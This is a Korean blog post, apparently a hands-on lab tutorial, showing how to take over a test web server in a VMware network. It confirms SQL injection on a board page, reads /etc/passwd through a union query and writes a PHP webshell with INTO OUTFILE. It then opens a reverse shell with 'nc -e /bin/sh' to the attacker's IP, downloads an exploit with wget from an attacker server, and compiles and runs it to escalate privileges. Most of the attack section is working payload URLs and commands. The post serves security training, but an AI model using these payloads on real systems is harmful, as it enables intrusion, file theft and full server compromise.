---
title: "SQL 익젝션 공격 실습(SQL Injection Attack)"
categories:
  - Web
tags:
  - Web hacking
  - SQL Injection
  - netcat
  - webshell
comments: true
---

파일 업로드 공격 취약점을 이용하여 서버의 root 권한을 획득하는 방법에 대해 기술한다.

> 1. 실습 환경설정
> 2. SQL Injection 취약점 확인 (Blind SQL Injection, Union SQL Injection 이용)
> 3. MYSQL 권한으로, webshell 생성하기
> 4. nc 를 통한 reverse connection
> 5. exploit code 업로드 및 실행을 통한 권한상승


# 1. 실습 환경설정

VMware [Edit]-[Virtual Network Editor]-[VMnet8] 에서 다음과 같이 설정한다.
- Subnet IP : 10.10.10.0
- DHCP Settings - starting ip address : 10.10.10.5
- DHCP Settings - starting ip address : 10.10.10.254

<center><p><img src="/assets/2019-01-28-post-web_sql/1.1.jpg"></p></center>

VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
- 공격대상 서버의 IP : 10.10.10.10
- 공격자 PC 의 IP : 10.10.10.1
- 공격대상 서버 URL : 10.10.10.10/test/
- 서비스 계정(id : test, pw : test)

<center><p><img src="/assets/2019-01-28-post-web_sql/1.2.png"></p><br><em>공격대상 서버 URL</em></center>
<center><p><img src="/assets/2019-01-28-post-web_sql/1.3.png"></p><br><em>서비스 계정</em></center>

# 2. SQL Injection 취약점 확인 (Blind SQL Injection, Union SQL Injection 이용)

로그인 이후, FREE BOARD, USER BOARD(취약점 존재), Q&A BOARD, SERVICE BOARD 등 게시판에서 취약점이 있는지 여부를 확인한다.

<center><p><img src="/assets/2019-01-28-post-web_sql/2.png"></p></center>

> 2.1. Blind SQL Injection

```
10.10.10.10/test/board.php?no=1 and 1=1 (TRUE)
10.10.10.10/test/board.php?no=1 and 1=0 (FALSE)
위 둘의 URL 실행결과가 다른 것을 통해 SQL Injection 공격 취약점이 존재하는 것을 파악할 수 있다.
```

```
[10.10.10.10/test/board.php?no=1 and 1=1 결과화면]
```

<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.1.png"></p></center>

```
[10.10.10.10/test/board.php?no=1 and 1=0 결과화면]
```

<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.2.png"></p></center>

> 2.2. Union SQL Injection

2.2.1. 컬럼개수 파악하기

```
http://10.10.10.10/test/board.php?no=0 order by 1 --
http://10.10.10.10/test/board.php?no=0 order by 2 --
~
http://10.10.10.10/test/board.php?no=0 order by 8 -- 까지는 에러가 발생하지 않는다..
http://10.10.10.10/test/board.php?no=0 order by 9 -- 부터 에러가 발생한다.
그러므로, 컬럼은 총 8개이다.
```

<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.1.png"></p></center>

2.2.2. 각각의 컬럼 위치 확인하기

```
http://10.10.10.10/test/board.php?no=0 union select 1,2,3,4,5,6,7,8 --
```

<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.2.png"></p></center>

2.2.3. Title 부분에 계정정보 출력하기

```
http://10.10.10.10/test/board.php?no=0 union select 1, load_file('/etc/passwd'),3,4,5,6,7,8 --
```

<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.3.png"></p></center>


# 3. MYSQL 권한으로, webshell 생성하기

> 3.1. MYSQL 권한으로 Webshell 생성

```
http://10.10.10.10/test/board.php?no=0 union select 1,"<?php system($_GET['cmd']); ?>",3,4,5,6,7,8 into outfile "/usr/local/apache/htdocs/test/shell.php" --
```

<center><p><img src="/assets/2019-01-28-post-web_sql/3.1.png"></p></center>

> 3.2. Webshell 동작 확인

```
http://10.10.10.10/test/shell.php?cmd=ls
```
<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.1.png"></p></center>

```
http://10.10.10.10/test/shell.php?cmd=ls  (nobody 권한인 것을 확인할 수 있다.)
```

<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.2.png"></p></center>


# 4. nc 를 통한 reverse connection

> 4.1. 공격자 PC 에서 nc 실행 후, 응답대기

cmd 창 2개 생성
- `cmd_1` : nc -l -p 33333<br>
nc 프로그램이 33333 번 포트로 응답대기(33333번 포트는 임의로 설정)
- `cmd_2` : netstat -na<br>
33333 포트가 응답대기인지 확인(프로그램이 제대로 실행되었는지 확인)

<center><p><img src="/assets/2019-01-28-post-web_sql/4.1.1.png"></p></center>
<center><p><img src="/assets/2019-01-28-post-web_sql/4.1.2.png"></p></center>


> 4.2. Web 에서 nc 실행하여, 공격 대상 서버 -> 공격자 PC 로 연결 (reverse connection)

```
10.10.10.10/test/shell.php?cmd=nc -e /bin/sh 10.10.10.1 33333
(10.10.10.1 은 공격자 PC ip 주소)
```

다음과 같이 탭에서 계속 돌고 있는 상황이면 정상적으로 실행이 된 것이다.

<center><p><img src="/assets/2019-01-28-post-web_sql/4.2.png"></p></center>

> 4.3. 연결확인

`cmd_1` : id (계정정보 확인)

<center><p><img src="/assets/2019-01-28-post-web_sql/4.3.png"></p></center>


# 5. exploit code 업로드 및 실행을 통한 권한상승

> 5.1. wget 을 통한 익스플로잇 코드 업로드

공격자 소유의 서버(10.10.10.20)에 있는 exploit code 를, 공격대상이 되는 서버에서 다운로드 하도록 한다. 

```
10.10.10.10/test/shell.php?cmd=wget http://10.10.10.20/exp.c
```

<center><p><img src="/assets/2019-01-28-post-web_sql/5.1.png"></p></center>


> 5.2. Webshell 에서 exp.c 다운로드 확인

```
10.10.10.10/test/shell.php?cmd=ls -al
```

<center><p><img src="/assets/2019-01-28-post-web_sql/5.2.png"></p></center>

> 5.3. NC 를 통해 (cmd_1)에서 확인

<center><p><img src="/assets/2019-01-28-post-web_sql/5.3.png"></p></center>

> 5.4. exploit code 컴파일 후 실행을 통한 권한상승

5.4.1. `gcc -o exp exp.c`

<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.1.png"></p></center>

5.4.2. `ls -al`

<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.2.png"></p></center>

5.4.3. `./exp  ,  id`

<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.3.png"></p></center>

<br>

{% if page.comments %}

<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://https-c0msherl0ck-github-io.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                            
{% endif %}
